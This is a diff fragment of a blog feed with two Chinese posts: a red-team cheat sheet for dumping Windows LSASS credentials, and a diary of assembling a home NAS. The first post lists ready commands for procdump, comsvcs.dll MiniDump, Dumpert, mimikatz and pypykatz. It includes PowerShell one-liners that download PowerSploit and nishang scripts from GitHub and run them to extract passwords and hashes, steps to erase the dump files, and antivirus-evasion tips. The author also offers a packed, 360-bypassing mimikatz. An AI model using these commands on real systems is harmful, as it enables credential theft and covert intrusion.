+    <content><![CDATA[前言：红队中各种抓取密码凭据的方法，文末彩蛋，内附工具链接，以及我制作的过360的minikatz的版本，各位请享用，最近筹备重新开blog，记录学习计划，不然我学完立马就忘了，与大家一起学习。
+1. Procdump 转储Lsass.exe 的内存:前提：需要管理员及以上权限
+常用命令：
+procdump  -accepteula -ma lsass.exe lsass_dump
+
+导出的.dmp文件本地配合minikatz 取出密码
+sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswords
+
+如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用更香：
+procdump -accepteula -ma pid lsass.dmp
+
+2. wce导出hash：前提：需要管理员及以上权限，版本限制（仅支持Windows XP，2003，Vista7、2008和Windows 8）
+命令：
+wce.exe -o file.txtwec.exe
+
+3. comsvcs.dll转储LSASS.exe内存前提：在powershell中运行，管理员权限以上
+命令：
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
+
+清理：
+Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore
+
+4.使用系统调用和拜托hook的api转储LSASS.exe内存详情请查看这篇文章：
+https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
+这是一篇非常nice的文章，值得一看，打开一个新世界的大门！
+有关github项目：
+https://github.com/outflanknl/Dumpert
+命令：
+dumpert_exe或者rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+
+运行效果截图：
+
+5.Windows Task Manager转储LSASS.exe内存直接打开任务管理器，找到lsass.exe进程，右键选中右键
+
+6.Mimikatz前提：管理员权限以及以上，建议自己编译源码去掉一些特征字符，一些不必要的语句
+命令：
+mimikatz_exe &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::logonpasswords full&quot; exit
+
+powershell：
+#读取明文密码powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts#读取hashpowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes
+
+猕猴桃杀软重点看照对象之一。
+7.pypykatz读取LSASS前提：必须安装python3，管理员权限以及以上
+命令：
+#安装pip install pypykatz#使用pypykatz live lsa
+
+抓得不只是lsass，还有其他的。
+运行效果：
+
+杀软拦截概率很低
+8. Out-Minidump.ps1 转储 LSASS.exe内存前提：powershell，管理员权限以及以上
+命令：
+powershell “IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;); get-process lsass | Out-Minidump”
+
+清除文件：
+Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+
+
+杀软会拦截。
+彩蛋福利请看过360的minikatz截图：
+
+
+不知道是不是我刚更新没有关网络，把我64位的搞死了，但是32位的依然坚挺！然后接着保险起见，加壳
+工具包里面有我编译好的一些工具，懂得都懂嗷，不会的百度。
+
+公众号关注回复，minikatz，即可获得百度云下载链接，重伸一遍，本公众号分享的工具，技术只供学习研究，切勿拿去违法犯罪，违法犯罪与公众号与作者无关。
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>凭证获取</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>年轻人的第一台NAS</title>
+    <url>/2023/02/25/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0NAS/</url>
+    <content><![CDATA[准备工作需要购置的零件有机箱（可以自己单独购买电源）、主板、内存条、硬盘
+1.机箱这里我买的是拓普龙6盘位NAS服务器机箱，不过不建议买6口的（贼难装，难怪没啥人买这款，早知道就不贪便宜直接买个8口的机箱要好装多了🤔）
+
+开箱如下，还不错的一点就是给配了一大包螺丝😘但是没分开来包装不好找要用的
+
+
+2.电源这里电源我是单独购买的台达150W电源（他喵的~我买的时候还需要12块运费，现在就变免运费啦🤡
+
+开箱如下，一块电源以及一根电源线
+
+3.主板主板我选的是映泰j4125，买的时候涨价了好贵~ 于是我选择了pdd购买能便宜挺多的
+
+
+4.内存条内存要求就不是很高了，随便买个4G的就行，不过有点需要注意的是颗粒数量，一定得买4颗粒的，商家一般都不会写出来所以比较坑
+
+如果不是4颗粒的，测试的时候就会出现如下问题，毫无反应（我这个内存应该拆开是8颗粒的😣以及这里U盘是要插在后面主板上的）
+
+5.硬盘这里我选的是海康威视的监控硬盘，两块4T的大概就花了七百块，依旧还是上pdd采购节省开销
+
+安装过程其实nas说好装也好装，说不好装也不好装😂就是一个萝卜一个坑
+先把电源根据机箱的结构固定到对应位置，再把电源上的线装好（这里想喷一下它这里接线可困难了，后板焊住了不能拆开，并且和sata线混在一块，可以说毫无发力点），这里我没有装扩展卡就只用到两根sata线，所以风扇也就没必要插上，需要注意的是硬盘线一定得按顺序接上并记住它
+
+然后就是主板了，先把我们要用到的两跟sata线按主板上写的1、2对应装上，再找到usb线和电源线找到对应位置装上，以及4pin、24pin线，内存条，然后根据机箱结构装上主板。这里想喷一下主板那里的螺丝孔特别歪，后面手被割了好几个口才勉强固定住（下图内存还没插上就是因为它翻车）
+
+组装好后不着急把壳装上，需要测试一下能不能用，先插上显示屏的HDMI线和装好pe的U盘，再插上电源线，效果如下：
+
+亮起来一般就没啥问题了，最后成功进入pe就可以装上了
+
+最后关机，把硬盘装好插上即可开始nas之旅😁
+
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>NAS</tag>
       </tags>
   </entry>
   <entry>
